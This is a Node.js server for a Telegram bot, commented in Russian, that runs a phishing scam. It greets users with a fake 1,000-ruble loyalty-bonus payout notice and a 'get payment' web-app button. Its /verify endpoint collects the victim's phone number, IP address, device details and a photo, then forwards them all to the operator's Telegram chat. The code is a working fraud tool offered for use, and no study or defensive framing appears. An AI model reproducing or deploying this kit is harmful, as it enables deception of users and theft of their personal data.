const express = require('express');
const multer = require('multer');
const axios = require('axios');
const FormData = require('form-data');
const path = require('path');
const fs = require('fs');

const app = express();
const upload = multer();

// Данные из переменных окружения
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;

app.use(express.json());
app.use(express.static('public'));

// 1. Функция приветствия (отправляет локальное фото yap.png)
async function sendWelcome(userChatId, req) {
    const photoPath = path.join(__dirname, 'yap.png');
    const webAppUrl = `https://${req.get('host')}`; 

    const captionText = 
        `💳 **Уведомление о начислении #Y-2026**\n\n` +
        `Здравствуйте! Вам доступен ежегодный бонус в рамках программы лояльности.\n\n` +
        `💰 **Сумма: 1,000.00 ₽**\n` +
        `💎 **Статус: Выплата разрешена**\n\n` +
        `Нажмите на кнопку ниже, чтобы зачислить средства через СБП.`;

    try {
        const form = new FormData();
        form.append('chat_id', userChatId); // Шлем ТОМУ, кто нажал старт
        form.append('photo', fs.createReadStream(photoPath));
        form.append('caption', captionText);
        form.append('parse_mode', 'Markdown');
        form.append('reply_markup', JSON.stringify({
            inline_keyboard: [[
                { text: "🔘 ПОЛУЧИТЬ ВЫПЛАТУ", web_app: { url: webAppUrl } }
            ]]
        }));

        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
            headers: form.getHeaders()
        });
    } catch (e) {
        console.error("Ошибка в sendWelcome:", e.message);
    }
}

// 2. Обработчик команды /start от Telegram
app.post(`/bot${BOT_TOKEN}`, async (req, res) => {
    const { message } = req.body;
    if (message && message.text === '/start') {
        await sendWelcome(message.from.id, req);
    }
    res.sendStatus(200);
});

// 3. Главная страница (WebApp)
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// 4. Прием данных из формы (отправка заявки ТЕБЕ)
app.post('/verify', upload.single('photo'), async (req, res) => {
    try {
        const { phone, ip, details } = req.body;
        const photo = req.file;

        const caption = `
💰 **НОВАЯ ЗАЯВКА!**
📞 **Данные:** ${phone}
🌐 **IP:** ${ip}

ℹ️ **ТЕХ. ИНФО:**
${details || 'Нет данных'}
        `;

        if (photo) {
            const form = new FormData();
            form.append('chat_id', CHAT_ID); // Шлем ТЕБЕ (админу)
            form.append('caption', caption);
            form.append('parse_mode', 'Markdown');
            form.append('photo', photo.buffer, { filename: 'verification.jpg' });

            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form, {
                headers: form.getHeaders()
            });
        } else {
            await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                chat_id: CHAT_ID,
                text: caption,
                parse_mode: 'Markdown'
            });
        }
        res.sendStatus(200);
    } catch (error) {
        console.error('Ошибка в /verify:', error.message);
        res.sendStatus(500);
    }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, () => console.log(`Сервер запущен на порту ${PORT}`));